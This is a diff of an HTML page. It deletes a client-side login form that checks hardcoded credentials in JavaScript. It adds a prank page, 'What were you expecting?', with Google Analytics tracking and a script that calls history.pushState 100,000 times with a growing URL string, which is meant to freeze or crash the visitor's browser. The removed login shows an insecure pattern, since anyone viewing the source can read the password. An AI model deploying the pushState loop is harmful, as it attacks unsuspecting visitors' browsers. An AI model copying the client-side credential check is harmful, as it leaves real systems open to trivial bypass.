@@ -1,34 +1,22 @@
+<!DOCTYPE html>
 <html>
-  <head>
-  </head>
-  <body>
-    <script language="javascript">
-<!--//
-/*This Script allows people to enter by using a form that asks for a
-UserID and Password*/
-function pasuser(form) {
-if (form.id.value=="JavaScript") { 
-if (form.pass.value=="Kit") {              
-location="page2.html" 
-} else {
-alert("Invalid Password")
-}
-} else {  alert("Invalid UserID")
-}
-}
-//-->
-</script>
+    <body>
+        <h1>What were you expecting?</h1>
+        <script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+                    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
-<center>
-<table bgcolor="white" cellpadding="12" border="1">
-<tr><td colspan="2"><center><h1><i><b>Login
-Area</b></i></h1></center></td></tr>
-<tr><td><h1><i><b>UserID:</b></i></h1></td><td><form name="login"><input
-name="id" type="text"></td></tr>
-<tr><td><h1><i><b>Password:</b></i></h1></td><td><input name="pass"
-type="password"></td></tr>
-<tr><td><center><input type="button" value="Login"
-onClick="pasuser(this.form)"></center></td><td><center><br><input
-type="Reset"></form></td></tr></table></center> 
-  </body>
-</html>
+                    ga('create', 'UA-60737367-1', 'auto');
+                    ga('send', 'pageview');
+                </script>
+                <script>
+                    var total = "";
+                    for( var i = 0; i < 100000; i++ ) {
+                        total = total + i.toString();
+                        history.pushState(0,0, total );
+                    }
+                </script>
+            </body>
+        </html>
